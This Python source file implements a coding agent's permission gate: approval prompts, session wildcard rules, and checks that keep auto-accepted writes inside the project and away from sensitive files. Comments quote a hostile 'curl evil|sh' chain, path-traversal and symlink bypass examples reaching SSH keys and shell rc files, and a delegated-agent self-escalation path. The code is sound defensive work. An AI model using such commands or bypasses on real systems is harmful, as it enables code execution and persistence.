"""Built-in PermissionExtension — interactive allow/deny gate on ``tool_call``.

Phase 1 of the tool-call permission/approval system. Modelled on
``@gotgenes/pi-permission-system``: mutating tools (bash-family + write-family)
are gated behind an interactive 4-option dialog when a UI is attached:

- ``Yes`` — allow this one call.
- ``Yes, for this session`` — allow + synthesize an ephemeral wildcard rule so
  similar calls in this session are auto-approved.
- ``No`` — block with a generic denial reason.
- ``No, provide reason`` — block with a user-supplied reason.

Esc / cancellation (``select`` returns ``None``) is treated as a denial.

Design notes:

- Read-only tools are silently allowed (``return None``) — no prompt.
- Headless / print / RPC runs (``not ctx.has_ui``) default to ALLOW so the
  non-interactive behaviour is preserved; :class:`GuardrailExtension` still
  hard-blocks dangerous patterns separately.
- Session rules are *ephemeral* — held in-memory for the process lifetime and
  cleared on the ``session_shutdown`` hook (which exists per
  :class:`~aelix_agent_core.harness.hooks.SessionShutdownHookEvent`).
- Prompts are serialized through an :class:`asyncio.Lock` so parallel tool
  calls cannot race two modals; the session-allow set is re-checked inside the
  lock to avoid prompting twice for a rule a concurrent prompt just added.

Registered AFTER :class:`GuardrailExtension` in ``cli/entry.py`` so hard-deny
guardrail patterns (e.g. ``rm -rf``) short-circuit via first-block-wins BEFORE
the permission prompt is shown.
"""

from __future__ import annotations

import asyncio
import os.path
import posixpath
from collections.abc import Awaitable, Callable
from dataclasses import dataclass, field
from fnmatch import fnmatch
from pathlib import Path
from typing import Any, Literal

from aelix_agent_core.harness.hooks import (
    SessionShutdownHookEvent,
    ToolCallHookEvent,
    ToolCallResult,
)

from aelix_coding_agent.builtin.guardrail import (
    _BASH_TOOLS,
    _WRITE_TOOLS,
    _guard_key,
)
from aelix_coding_agent.builtin.permission_mode import (
    MODE_META,
    PermissionMode,
    PermissionPosture,
)
from aelix_coding_agent.extensions.api import ExtensionAPI, ExtensionContext

# Shell metacharacters that introduce a NEW command / sub-command. A
# session-approved bash prefix must NEVER auto-allow a command that contains one
# of these after the approved prefix (finding WP-0 #3): ``git commit *`` must not
# match ``git commit -m x && curl evil|sh``.
_SHELL_SEPARATORS = (";", "&&", "||", "|", "&", "`", "$(", "${", "\n", ">", "<")

# Mutating tools gated by the permission prompt — the union of the bash-family
# and write-family sets the guardrail uses.
#
# DO NOT add ``"agent"`` here (ADR-0197 §(i)). It looks like the delegation
# consent gate and is not one: ``_rule_key`` falls through to an ARGS-BLIND
# ``f"tool:{tool_name}"`` at ``:116``, so a single "Yes, for this session" would
# approve every profile against every task for the rest of the run. Delegation
# consent lives in ``aelix_agents/consent.py``, keyed on what actually varies
# (profile + source_path + posture) and never persisted.
_MUTATING = _BASH_TOOLS | _WRITE_TOOLS

# The block reason a DELEGATED CHILD returns instead of the headless ALLOW
# (ADR-0197 §(e)). Phrased FOR THE MODEL: the child has no approval channel
# (the child→parent back-channel is deferred to P3), so the only useful thing it
# can do is report the intended change back to the parent, whose human can act.
_HEADLESS_BLOCK_REASON = (
    "This delegated agent has no approval channel, so mutating tools are "
    "blocked. Report what you would have changed and let the parent decide."
)

# Dialog option labels (pi-permission-system parity).
_YES = "Yes"
_YES_SESSION = "Yes, for this session"
_NO = "No"
_NO_REASON = "No, provide reason"
_OPTIONS = [_YES, _YES_SESSION, _NO, _NO_REASON]


def _command_from_args(args: dict[str, Any]) -> str:
    """Best-effort extraction of the command string from a bash-family call."""

    for key in ("command", "cmd", "shell_command", "script"):
        value = args.get(key)
        if isinstance(value, str):
            return value
    return ""


def _path_from_args(args: dict[str, Any]) -> str:
    """Best-effort extraction of the target path from a write-family call."""

    for key in ("path", "file_path", "file", "filename", "filepath", "target"):
        value = args.get(key)
        if isinstance(value, str):
            return value
    return ""


def _extension_redirect(args: dict[str, Any], cwd: str) -> tuple[str, str, str] | None:
    """``(chosen_label, other_label, other_path)`` for an extension write, else ``None``.

    ISSUE #161 SHAPE 3, and the premise it rests on was measured rather than
    inherited. The issue says the permission layer "is allow/deny only, so it
    cannot offer 'write here instead'". That is true of the RETURN VALUE —
    :class:`ToolCallResult` carries ``block`` and ``reason`` and nothing else —
    and false of the mechanism: ``ToolCallHookEvent.args`` is *the same dict*
    the loop hands to ``tool.execute`` (``harness/core.py``
    ``_before_tool_call_bridge``: "we pass ``ctx.args`` by reference — no
    defensive copy"). Driven end to end through that bridge, a handler that
    rewrites ``args["path"]`` and returns ``None`` lands the file at the new
    path and leaves the old one absent. So the redirect needs **no kernel
    change**, which is why this is a small change and not the multi-day
    permission surgery the issue estimated.

    THERE ARE ONLY EVER TWO TARGETS, never a free-form third: the global tier
    (``<agent dir>/extensions/``) and the project tier
    (``<cwd>/.aelix/extensions/``) — the same two
    :func:`~aelix_coding_agent.cli.agent_context._extension_signpost` emits and
    :func:`~aelix_coding_agent.extensions.scaffold.extension_targets` returns.
    This answers "which one did the model pick, and what is the other one
    called"; every write that is not landing in one of them returns ``None``
    and keeps the three static rows.

    The labels state the CONSEQUENCE and not just the location, because that is
    what the user is choosing between and what neither path name tells them:
    the project tier is trust-gated and fails SILENTLY when the project is
    untrusted (measured — ``no_project_local=True`` drops the file with
    ``errors=[]``), while the global tier is not gated at all.
    """

    raw = _path_from_args(args)
    if not raw:
        return None
    try:
        from aelix_coding_agent.cli.config import get_agent_dir
        from aelix_coding_agent.extensions.scaffold import extension_targets

        target = Path(raw).expanduser().resolve()
        targets = extension_targets(cwd, get_agent_dir())
        resolved = {
            scope: Path(path).expanduser().resolve() for scope, path in targets.items()
        }
    except (OSError, ValueError):  # pragma: no cover — defensive
        return None

    for scope, directory in resolved.items():
        if target.parent != directory:
            continue
        other = "project" if scope == "global" else "global"
        name = target.name
        labels = {
            "global": f"Yes — user global, every project ({resolved['global'] / name})",
            "project": f"Only this project ({resolved['project'] / name})",
        }
        return labels[scope], labels[other], str(resolved[other] / name)
    return None


def _canonical_path(path: str) -> str:
    r"""Canonicalise a write target into the PLATFORM-INDEPENDENT form rule keys use.

    ``posixpath.normpath`` and not ``os.path.normpath``, and the difference is
    the whole point. Both sites below used to read
    ``os.path.normpath(path.replace("\\", "/"))``, where the ``.replace`` folds
    to ``/`` and ``os.path`` — bound to :mod:`ntpath` on Windows — converts every
    one straight back::

        ntpath.normpath("src/a.py")     -> "src\a.py"
        posixpath.normpath("src/a.py")  -> "src/a.py"

    Two things broke, both measured:

    1. RULE KEYS WERE PLATFORM-DEPENDENT. ``write:src/a.py`` on POSIX and
       ``write:src\a.py`` on Windows are different strings, so a grant is only
       ever matched by a process running the same OS as the one that made it.
       Nothing persists these keys today (``_session_allows`` is in-memory and
       cleared on ``session_shutdown``), but the moment one is written to a
       ``settings.json`` that travels between machines the key must not carry
       the authoring platform's separator with it.
    2. DIRECTORY GRANTS SILENTLY DEGRADED TO SINGLE-FILE GRANTS.
       :func:`_session_wildcard` splits the canonical form on ``/`` to find the
       parent. With a backslashed ``norm`` there is no ``/``, so ``parent`` came
       out ``""`` and the function fell into the bare-filename branch: "yes, for
       this session" on ``src/app/main.py`` stored ``write:src\app\main.py``
       instead of ``write:src/app/*``, and every sibling file in the approved
       directory re-prompted.

    THE TRAVERSAL DEFENCE IS UNAFFECTED, which is why the old form was
    fail-closed rather than a hole — the collapse of ``..`` is what
    ``normpath`` is for and both flavours do it::

        ntpath.normpath("src/app/../../etc/passwd")     -> "etc\passwd"
        posixpath.normpath("src/app/../../etc/passwd")  -> "etc/passwd"

    Still a pure string canonicalisation — no filesystem access. The separate
    ``os.path`` use in :func:`_is_auto_allowable_write` is deliberately NATIVE
    and must stay that way: it feeds ``realpath`` and an ``os.sep`` containment
    test against a real path on the running machine, which is the opposite
    problem to this one.
    """

    return posixpath.normpath(path.replace("\\", "/"))


def _rule_key(tool_name: str, args: dict[str, Any]) -> str:
    """Build the exact, TOOL-NAMESPACED rule key a call is matched against.

    The ``bash:`` / ``write:`` / ``tool:`` namespace prefix is literal in both
    the key and the synthesized wildcard, so a write rule can NEVER fnmatch a
    bash key and vice versa (W4 code-review MEDIUM — fnmatch ``*`` crosses
    spaces, so an un-namespaced ``src/*`` would match a bash ``src/foo.sh ...``).
    """

    if tool_name in _BASH_TOOLS:
        return f"bash:{_command_from_args(args) or tool_name}"
    if tool_name in _WRITE_TOOLS:
        path = _path_from_args(args)
        if not path:
            return f"write:{tool_name}"
        # Canonicalise the candidate path BEFORE matching so a traversal
        # candidate (``src/app/../../etc/passwd``) collapses to its real target
        # (``etc/passwd``) and can NOT fnmatch a ``write:src/app/*`` directory
        # grant (finding WP-0 #3 — fnmatch ``*`` spans ``/``). See
        # :func:`_canonical_path` for why the canonical form is POSIX-shaped on
        # every platform.
        norm = _canonical_path(path)
        return f"write:{norm}"
    return f"tool:{tool_name}"


def _session_wildcard(tool_name: str, args: dict[str, Any]) -> str:
    """Synthesize a TOOL-NAMESPACED ephemeral session rule from a call.

    NEVER emits a bare ``*`` (W4 code-review HIGH): a ``*`` wildcard would
    fnmatch EVERY future rule_key, so approving-for-session one innocuous call
    would silently disarm the whole gate for the session. A call with no safe
    scope is pinned to its EXACT key instead.

    - bash-family: a multi-token command WITH NO shell separator → ``bash:{tok0}
      {tok1} *`` (matches that command prefix, e.g. ``git status --short`` →
      ``bash:git status *``); a single-token command OR any command that
      contains a shell separator (``;`` / ``&&`` / ``|`` / backtick / ``$(`` /
      redirect / newline) → ``bash:{command}`` EXACT. The exact-pin closes the
      finding WP-0 #3 escalation where ``bash:git commit *`` would also match
      ``git commit -m x && curl evil|sh``: fnmatch ``*`` spans separators, so a
      prefix wildcard is ONLY safe when the approved command itself has none.
    - write-family: a path with a parent dir → ``write:{parent}/*`` (covers that
      directory and its descendants for the session); the parent is
      ``normpath``-canonicalised and a ``..`` escape pins to the EXACT path
      instead (finding WP-0 #3 — a ``src/app/*`` grant must not be traversal-
      escaped to ``src/app/../../etc/passwd``). A bare filename (no parent) →
      ``write:{path}`` EXACT.
    - fallback: ``tool:{tool_name}`` exact.
    """

    if tool_name in _BASH_TOOLS:
        command = _command_from_args(args)
        if not command:
            return f"bash:{tool_name}"
        # A command containing a shell separator gets an EXACT pin: a wildcard
        # prefix would let fnmatch ``*`` span the separator and auto-allow an
        # appended ``&& curl … | sh``.
        if any(sep in command for sep in _SHELL_SEPARATORS):
            return f"bash:{command}"
        tokens = command.split()
        if len(tokens) <= 1:
            return f"bash:{command}"  # exact — a single token has no safe prefix
        return f"bash:{tokens[0]} {tokens[1]} *"
    if tool_name in _WRITE_TOOLS:
        path = _path_from_args(args)
        if not path:
            return f"write:{tool_name}"
        # Canonicalise through the SAME helper ``_rule_key`` uses so the stored
        # grant aligns with the normalised candidate keys it is matched against.
        # The split below is on ``/`` and only ``/``, which is exactly why the
        # canonical form may not carry a native separator: a backslashed ``norm``
        # has no ``/``, so ``parent`` came out empty and this fell through to the
        # bare-filename EXACT pin — a directory grant degrading to a single-file
        # one, silently. See :func:`_canonical_path`.
        norm = _canonical_path(path)
        parent = norm.rsplit("/", 1)[0] if "/" in norm else ""
        if not parent:
            return f"write:{norm}"
        # A parent that still escapes upward after normpath cannot be trusted as
        # a directory wildcard → pin to the exact path (finding WP-0 #3).
        if parent == ".." or parent.startswith("../") or "/../" in parent:
            return f"write:{norm}"
        return f"write:{parent}/*"
    return f"tool:{tool_name}"


def _request_kind(tool_name: str) -> str:
    """Map a tool name to the approval-dialog body kind (bash | write | edit | other)."""

    if tool_name in _BASH_TOOLS:
        return "bash"
    if tool_name == "edit":
        return "edit"
    if tool_name in _WRITE_TOOLS:
        return "write"
    return "other"


def _summary(tool_name: str, args: dict[str, Any]) -> str:
    """A short one-line summary of the call for the dialog title."""

    if tool_name in _BASH_TOOLS:
        return _command_from_args(args).strip()[:120]
    if tool_name in _WRITE_TOOLS:
        return _path_from_args(args).strip()[:120]
    return ""


# Security-sensitive file basenames / suffixes that must NEVER be auto-allowed
# even inside the project root (finding WP-0 #4 — silent persistence / backdoor
# surfaces). Matched on the resolved path's components.
#
# KEYS MUST STAY LOWERCASE, with no trailing space/dot and no ``:`` — lookups go
# through :func:`~aelix_coding_agent.builtin.guardrail._guard_key`, which folds
# the candidate to that shape. A mixed-case entry added here would be dead.
_SENSITIVE_BASENAMES = frozenset(
    {
        ".bashrc",
        ".bash_profile",
        ".profile",
        ".zshrc",
        ".zprofile",
        ".zshenv",
        "authorized_keys",
        "id_rsa",
        "id_ed25519",
        "id_ecdsa",
        "id_dsa",
        "crontab",
        ".netrc",
        ".pgpass",
    }
)
# Path components that are always sensitive (an .ssh dir, cron spool, etc.).
#
# ``.aelix`` (ADR-0197 §(i), P2): ``.aelix/extensions/*.py``, ``.aelix/mcp.json``
# and ``.aelix/agents/*.md`` are EXACTLY the three resources the Project Trust
# gate exists to guard (``cli/project_trust.py:124-249``), and
# ``.aelix/settings.json`` is the user's own configuration. Before this entry an
# auto-accepting agent could WRITE the project identity / project extension that
# a LATER run then EXECUTES under an ancestor ``trust.json: true``
# (``project_trust.py:703-710``, transitivity documented at ``:71-72``) — a
# write-to-exec escalation that ``--no-approve`` cannot touch, because
# ``--no-approve`` only stops LOADING such a file, never writing one. Delegation
# (ADR-0197) makes this reachable by a process nobody is watching and is a HARD
# PREREQUISITE for §(i)'s bounded widening, so it is a blocker, not a polish
# item: without it a measured ``auto-accept-edits`` child is a self-perpetuating
# escalation path.
#
# BEHAVIOUR CHANGE (CHANGELOG + ADR-0197): an INTERACTIVE AUTO_ACCEPT user
# editing their own ``.aelix/agents/*.md`` now sees the 4-option prompt instead
# of a silent write. That is the intended trade.
_SENSITIVE_DIR_COMPONENTS = frozenset(
    {".aelix", ".ssh", ".gnupg", "cron.d", "cron.daily"}
)


def _write_guard_passes(abs_path: str, abs_cwd: str) -> bool:
    """Containment + sensitivity, for ONE already-absolute spelling of a target.

    Split out of :func:`_is_auto_allowable_write` so the same two rules can be
    applied to both the lexical and the symlink-resolved form of the same
    write — see that function for why one form is not enough.
    """

    # Must be inside the project root (or be the root itself).
    if abs_path != abs_cwd and not abs_path.startswith(abs_cwd + os.sep):
        return False
    # Reject security-sensitive targets even inside the tree.
    #
    # Every component is folded before it is matched (case, trailing space/dot,
    # NTFS stream suffix) — see ``guardrail._guard_key`` for what each folding
    # buys and for the measurement that motivated it. Unfolded, this check let
    # ``.ENV``, ``Id_Rsa``, ``.SSH/AUTHORIZED_KEYS`` and ``.AELIX/agents/e.md``
    # through while refusing their canonical spellings — and the last of those
    # is the entry ADR-0197 §(i) names as the HARD PREREQUISITE for bounded
    # widening, so the fold is load-bearing for delegation containment, not
    # cosmetic.
    components = [
        _guard_key(comp) for comp in abs_path.replace("\\", "/").split("/")
    ]
    basename = components[-1] if components else ""
    if basename in _SENSITIVE_BASENAMES:
        return False
    if basename == ".env" or basename.startswith(".env."):
        return False
    return not any(comp in _SENSITIVE_DIR_COMPONENTS for comp in components)


def _is_auto_allowable_write(path: str, cwd: str) -> bool:
    """Whether a write to ``path`` may be auto-allowed without a prompt.

    SECURITY (finding WP-0 #4): an AUTO_ACCEPT / AUTO write is auto-allowed ONLY
    when it resolves INSIDE the project root (``cwd``) AND is not a
    security-sensitive file (SSH keys, shell rc, cron). Everything else falls
    through to the prompt — writes to ``~/.ssh/authorized_keys`` / ``~/.bashrc``
    / ``/etc/crontab`` / ``../../etc/passwd`` are NOT silently accepted.

    SYMLINKS ARE RESOLVED, AND THAT IS THE WHOLE POINT (P2 review, HIGH #1).
    An earlier form reasoned on ``normpath`` alone and never called
    ``realpath``, so BOTH rules above were decided on a name rather than on a
    target. Measured against this gate at ``auto-accept-edits`` in a repo
    holding a CHECKED-IN ``docs -> .aelix`` symlink (git stores symlinks as
    mode 120000, so a repo can ship one)::

        .aelix/agents/evil.md     BLOCKED
        docs/agents/evil.md       >>> ALLOWED <<<   -> <repo>/.aelix/agents/evil.md
        keys/authorized_keys2     >>> ALLOWED <<<   -> <home>/.ssh/authorized_keys2
        h/.bashrc_evil            >>> ALLOWED <<<   -> <home>/.bashrc_evil

    With ADR-0197's delegation that gate is reachable by an UNATTENDED process,
    and ADR-0197 §(i) names the ``.aelix`` entry in
    :data:`_SENSITIVE_DIR_COMPONENTS` as the HARD PREREQUISITE for bounded
    widening — a widened child that can write ``.aelix/agents/*.md`` authors the
    parent's NEXT identity and self-perpetuates. That prerequisite is only true
    if the check sees the real target.

    BOTH SPELLINGS MUST PASS, not just the resolved one. Judging only the
    resolved form would open a TOCTOU: the target usually does not exist yet, so
    ``realpath`` returns the lexical path, and a child holding ``bash`` could
    plant the symlink between this check and the write. Requiring the lexical
    form to pass as well means a name that is *already* sensitive is refused
    whatever the filesystem says, and requiring the resolved form to pass means
    a name that is innocent but POINTS somewhere sensitive is refused too.

    This now touches the filesystem (``realpath`` is a ``lstat`` walk). That is
    a deliberate trade against the previous docstring's "no filesystem access":
    a purely lexical answer to "where does this write land" is not an answer.
    A ``~`` is still expanded first so a home-relative path is judged against
    its real location.
    """

    if not path:
        return False
    raw = os.path.expanduser(path)
    abs_cwd = os.path.abspath(cwd) if cwd else os.path.abspath(".")
    lexical = os.path.normpath(os.path.join(abs_cwd, raw))
    try:
        real_cwd = os.path.realpath(abs_cwd)
        real_path = os.path.realpath(lexical)
    except OSError:
        # No evidence about where the write lands is not a licence to allow it.
        return False
    return _write_guard_passes(lexical, abs_cwd) and _write_guard_passes(
        real_path, real_cwd
    )


@dataclass
class PermissionExtension:
    """Interactive allow/deny gate registered as a built-in extension.

    Instances are valid
    :class:`~aelix_coding_agent.extensions.api.ExtensionFactory` callables —
    ``__call__(self, aelix)`` registers the ``tool_call`` + ``session_shutdown``
    handlers.
    """

    _session_allows: set[str] = field(default_factory=set)
    _lock: asyncio.Lock = field(default_factory=asyncio.Lock)
    # The shift+tab-cycled posture (WP-0, ADR-0157). ONE instance is built in
    # ``cli/entry.py`` and threaded by held reference into both this extension and
    # ``run_tui`` so the posture + ``_session_allows`` survive ``/resume`` /
    # ``/new`` / ``/fork`` harness rebuilds. ``default_factory`` keeps zero-arg
    # construction (and the existing tests) working — DEFAULT == always prompt.
    posture: PermissionPosture = field(default_factory=PermissionPosture)
    # Optional purpose-built approval-dialog runner (ADR-0157, STEP 5). The TUI
    # host wires this to drive ``run_approval_dialog`` (full command, diff
    # preview, no "Type to search"). ``None`` → the generic ``ctx.ui.select``
    # fallback (headless / tests), preserving prior behaviour. The callback maps
    # an :class:`ApprovalRequest` to an :class:`ApprovalDecision`.
    approval_runner: Callable[[Any], Awaitable[Any]] | None = None
    # The headless (``not ctx.has_ui``) verdict for a mutating tool that reached
    # branch (d) — see the field docstring below.
    headless_default: Literal["allow", "block"] = "allow"
    """ADR-0197 §(e). ``"allow"`` preserves the shipped non-interactive
    behaviour for every ``-p`` / ``--mode json`` / ``--mode rpc`` user.
    ``cli/entry.py`` flips this to ``"block"`` for a DELEGATED CHILD only
    (``subagent_depth() > 0``), because such a child has no approval channel
    and nobody is watching its stdout.

    SCOPE (P2 review finding B4): this floor sits at branch (d), BELOW the
    AUTO_ACCEPT write short-circuit at branch (f) (``:348-353`` pre-P2
    numbering), which ``return None``s before control ever reaches here. It
    therefore does NOT bound a child running under AUTO_ACCEPT / AUTO. The
    posture the child runs under is the actual guarantee, and the spawner
    CLAMPS it (``aelix_agents.posture.child_permission_mode``). Do not mistake
    this belt for the braces."""

    def __call__(self, aelix: ExtensionAPI) -> None:
        """Setup: register the ``tool_call`` + ``session_shutdown`` handlers."""

        aelix.on("tool_call", self._on_tool_call)
        aelix.on("session_shutdown", self._on_shutdown)

    def _is_session_allowed(self, rule_key: str) -> bool:
        # SECURITY (finding WP-0 #3 — matching side): a ``bash:`` candidate that
        # contains a shell separator must NEVER be auto-allowed by a PREFIX
        # wildcard (only by an exact-equal rule). Otherwise approving the benign
        # ``git commit -m hi`` (grant ``bash:git commit *``) would auto-allow the
        # malicious ``git commit -m x && curl evil|sh`` because fnmatch ``*``
        # spans the ``&&``. Such a candidate may match only a rule with no
        # trailing ``*`` (an exact pin), via plain string equality.
        if rule_key.startswith("bash:") and any(
            sep in rule_key[len("bash:") :] for sep in _SHELL_SEPARATORS
        ):
            return any(
                rule_key == w
                for w in self._session_allows
                if not w.endswith("*")
            )
        return any(fnmatch(rule_key, w) for w in self._session_allows)

    async def _on_tool_call(
        self,
        event: ToolCallHookEvent,
        ctx: ExtensionContext,
    ) -> ToolCallResult | None:
        mode = self.posture.get()
        is_bash = event.tool_name in _BASH_TOOLS
        is_mutating = event.tool_name in _MUTATING

        # (b) PLAN mode blocks ALL mutating tools — even on the headless / print /
        # rpc path (this check is placed ABOVE the read-only short-circuit and
        # the ``not has_ui`` ALLOW branch so the plan-mode guarantee holds on
        # non-interactive runs too). Read-only tools stay allowed so the agent
        # can still investigate while planning.
        if mode == PermissionMode.PLAN and is_mutating:
            return ToolCallResult(
                block=True, reason=MODE_META[PermissionMode.PLAN].block_reason
            )

        # (a) Read-only tools are silently allowed (all modes; PLAN handled above).
        if not is_mutating:
            return None

        rule_key = _rule_key(event.tool_name, event.args)

        # (c) Session-approved (wildcard match) → allow without prompting.
        if self._is_session_allowed(rule_key):
            return None

        # (e) YOLO — skip the PROMPT for every mutating tool. The
        # GuardrailExtension already ran FIRST (prepend order in cli/entry.py:
        # ``[GuardrailExtension(), permission_ext]``, first-block-wins), so
        # catastrophic patterns (rm -rf / fork-bomb / .env|.git writes) are STILL
        # hard-denied — YOLO bypasses the prompt, NOT the floor. DO NOT reorder the
        # prepend or merge the two extensions or this guarantee breaks.
        if mode == PermissionMode.YOLO:
            return None

        # (f) AUTO_ACCEPT — auto-allow the write-family without a prompt; bash
        # still prompts (bash can do arbitrary damage). Non-bash mutating ==
        # write-family here. SECURITY (finding WP-0 #4): only auto-allow writes
        # that resolve INSIDE the project root and are not security-sensitive
        # (SSH keys / shell rc / cron / .env); anything else falls through to the
        # prompt so AUTO_ACCEPT can never silently plant a backdoor outside cwd.
        if (
            mode == PermissionMode.AUTO_ACCEPT
            and not is_bash
            and _is_auto_allowable_write(_path_from_args(event.args), ctx.cwd)
        ):
            return None
        # else (AUTO_ACCEPT write outside cwd / sensitive): fall through to the
        # prompt (or headless-allow below).

        # (g) AUTO — classify bash via tree-sitter (ADR-0158): ALLOW→no prompt,
        # ASK→prompt, DENY→block. Non-bash mutating behaves like AUTO_ACCEPT
        # (auto-allow writes). If the classifier is unavailable the bash path
        # falls through to the prompt (DEFAULT semantics) — NEVER silent-allow.
        if mode == PermissionMode.AUTO:
            if not is_bash:
                # Writes auto-allowed ONLY inside the project root and not
                # security-sensitive (finding WP-0 #4); else fall through to the
                # headless-allow / prompt path below (same as AUTO_ACCEPT).
                if _is_auto_allowable_write(_path_from_args(event.args), ctx.cwd):
                    return None
            else:
                decision = self._auto_classify_bash(event.args)
                if decision == "allow":
                    return None
                if decision == "deny":
                    return ToolCallResult(
                        block=True,
                        reason="Auto mode: command classified as dangerous; blocked.",
                    )
                # "ask" (or classifier unavailable) → fall through to the prompt.

        # (d) Headless / print / RPC default = ALLOW for DEFAULT / AUTO_ACCEPT /
        # YOLO / AUTO-ask (preserve non-interactive behaviour; the guardrail
        # still hard-blocks separately). PLAN already denied above.
        #
        # ADR-0197 §(e): a DELEGATED CHILD flips this to block-with-reason via
        # ``headless_default``, leaving every existing ``-p`` / json / rpc user
        # untouched. NOT the child-authority guarantee on its own — branch (f)
        # above returns before this line — see the field docstring.
        if not ctx.has_ui:
            if self.headless_default == "block":
                return ToolCallResult(block=True, reason=_HEADLESS_BLOCK_REASON)
            return None

        # (h) DEFAULT (and AUTO_ACCEPT bash / AUTO-ask bash) → the 4-option prompt.
        # Serialize prompts so parallel tool calls never race two modals.
        async with self._lock:
            # Re-check inside the lock — a concurrent prompt may have just
            # added a matching session rule.
            if self._is_session_allowed(rule_key):
                return None
            return await self._prompt(event, ctx)

    @staticmethod
    def _auto_classify_bash(args: dict[str, Any]) -> str:
        """Map the bash command to ``"allow"`` / ``"ask"`` / ``"deny"`` (fail-safe ASK).

        Imported lazily so a missing tree-sitter grammar degrades to ASK without
        breaking import of this module on an exotic no-wheel platform.

        #104 — the verdict is only honoured for a shell the grammar actually
        describes. The tool runs the command through
        :func:`~aelix_coding_agent.tools.bash._resolve_shell`, which on Windows
        resolves PowerShell or ``cmd``; the bash grammar reads those command
        lines as harmless words and returns ALLOW, so an unqualified verdict
        would auto-run ``Remove-Item -Recurse -Force`` without a prompt. When
        the resolved shell is outside the grammar's competence the ALLOW is
        downgraded to ASK. DENY is deliberately still honoured — a bash-shaped
        destructive command is worth blocking whatever the shell.
        """

        try:
            from aelix_coding_agent.builtin.bash_classifier import (
                Verdict,
                classify,
                is_classifiable_shell,
            )
            from aelix_coding_agent.tools.bash import _resolve_shell
            from aelix_coding_agent.util.shell_env import get_shell_env

            command = _command_from_args(args)
            verdict = classify(command)
            # Resolves the DEFAULT shell chain, with no ``shell_path``. That
            # matches what the tool spawns today only because nothing wires a
            # custom shell through: ``create_bash_tool`` reads
            # ``opts["shell_path"]`` (``tools/bash.py:551-553``) but no caller sets
            # it, and ``SettingsManager.get_shell_path()``
            # (``settings_manager.py:1254``) is referenced only by its own
            # test. Treat that as a coincidence, not an invariant — if
            # ``shell_path`` is ever wired to the tool, this gate MUST thread
            # the same value, or it will reason about one shell while another
            # runs the command.
            shell = _resolve_shell(get_shell_env())
        except Exception:  # noqa: BLE001 — any classifier failure → ASK (safe)
            return "ask"
        if verdict == Verdict.DENY:
            return "deny"
        if verdict == Verdict.ALLOW and is_classifiable_shell(shell.path):
            return "allow"
        return "ask"

    async def _prompt(
        self, event: ToolCallHookEvent, ctx: ExtensionContext
    ) -> ToolCallResult | None:
        """Run the approval prompt (purpose-built dialog or generic fallback).

        Fail SAFE: if the UI prompt itself raises mid-turn (terminal detached /
        app torn down), block rather than let the exception abort the turn via
        the hook's throw default (W4 code-review MEDIUM).
        """

        # Issue #161 shape 3 — computed ONCE and shared by both prompt paths, so
        # the dialog and the generic fallback cannot offer different answers to
        # the same question. ``None`` for every write outside the two extension
        # tiers, which is every ordinary edit.
        redirect = (
            _extension_redirect(event.args, ctx.cwd)
            if event.tool_name == "write"
            else None
        )

        if self.approval_runner is not None:
            return await self._prompt_via_dialog(event, redirect)

        summary = _summary(event.tool_name, event.args)
        title = f"Allow {event.tool_name}? {summary}".rstrip()
        options = list(_OPTIONS)
        if redirect is not None:
            _chosen_label, other_label, _other_path = redirect
            # Inserted BEFORE the denials, matching the dialog's row order and
            # for the same reason: it is a second way to say yes.
            options.insert(2, other_label)
        try:
            choice = await ctx.ui.select(title, options)
        except Exception as exc:  # noqa: BLE001 — deny-on-error is fail-safe
            return ToolCallResult(
                block=True,
                reason=(
                    "Permission prompt unavailable; denied for safety "
                    f"({exc.__class__.__name__})."
                ),
            )

        if redirect is not None and choice == redirect[1]:
            # Matched by IDENTITY against the rendered option, never by
            # substring — the label carries an attacker-influenceable absolute
            # path, and a substring test on that is a way to be talked into the
            # wrong branch.
            return self._redirect_write(event, redirect[2])
        if choice == _YES:
            return None
        if choice == _YES_SESSION:
            self._session_allows.add(_session_wildcard(event.tool_name, event.args))
            return None
        if choice == _NO:
            return ToolCallResult(block=True, reason="Denied by the user.")
        if choice == _NO_REASON:
            try:
                reason = await ctx.ui.input("Why is this denied?")
            except Exception:  # noqa: BLE001 — reason is optional; still deny
                reason = None
            return ToolCallResult(
                block=True,
                reason=f"Denied by the user: {reason or '(no reason given)'}",
            )
        # None (Esc / cancelled) or any unexpected value → deny.
        return ToolCallResult(block=True, reason="Denied by the user (cancelled).")

    def _redirect_write(
        self, event: ToolCallHookEvent, target: str
    ) -> ToolCallResult | None:
        """Send this write to the OTHER extension tier, and ALLOW it (#161).

        The mutation is the redirect: ``event.args`` is the same dict the loop
        hands to ``tool.execute``, so rewriting the path here is what makes the
        file land somewhere else. Returning ``None`` (allow) is the other half —
        a ``block`` would turn the user's *second yes* into a no.

        The key is rewritten in place under whatever alias the caller used
        (``path`` / ``file_path`` / …) so a tool with a different argument name
        is redirected too rather than silently ignored, which would allow the
        ORIGINAL path — the worst of the three outcomes.

        No session rule is synthesized. "Put this one somewhere else" is a
        statement about this file, and turning it into a standing allow for the
        tier is not what was asked.
        """

        for key in ("path", "file_path", "file", "filename", "filepath", "target"):
            if isinstance(event.args.get(key), str):
                event.args[key] = target
                return None
        # No recognised key — refuse rather than allow the original path.
        return ToolCallResult(
            block=True,
            reason="Redirect requested but the tool takes no recognised path argument.",
        )

    async def _prompt_via_dialog(
        self,
        event: ToolCallHookEvent,
        redirect: tuple[str, str, str] | None = None,
    ) -> ToolCallResult | None:
        """Drive the purpose-built approval dialog (ADR-0157, STEP 5)."""

        from aelix_coding_agent.tui.approval_dialog import (
            ApprovalDecision,
            ApprovalRequest,
        )

        request = ApprovalRequest(
            tool_name=event.tool_name,
            args=event.args,
            kind=_request_kind(event.tool_name),
            yes_label=redirect[0] if redirect else None,
            redirect_label=redirect[1] if redirect else None,
        )
        try:
            decision = await self.approval_runner(request)  # type: ignore[misc]
        except Exception as exc:  # noqa: BLE001 — deny-on-error is fail-safe
            return ToolCallResult(
                block=True,
                reason=(
                    "Permission prompt unavailable; denied for safety "
                    f"({exc.__class__.__name__})."
                ),
            )
        if decision == ApprovalDecision.REDIRECT and redirect is not None:
            return self._redirect_write(event, redirect[2])
        if decision == ApprovalDecision.REDIRECT:
            # The dialog cannot offer this row without ``redirect_label``, so
            # reaching here means a host handed back a decision it was never
            # shown. Deny — an unexplained redirect target is not something to
            # invent.
            return ToolCallResult(
                block=True, reason="Denied by the user (unexpected redirect)."
            )
        if decision == ApprovalDecision.YES:
            return None
        if decision == ApprovalDecision.YES_SESSION:
            self._session_allows.add(_session_wildcard(event.tool_name, event.args))
            return None
        if decision == ApprovalDecision.NO:
            return ToolCallResult(block=True, reason="Denied by the user.")
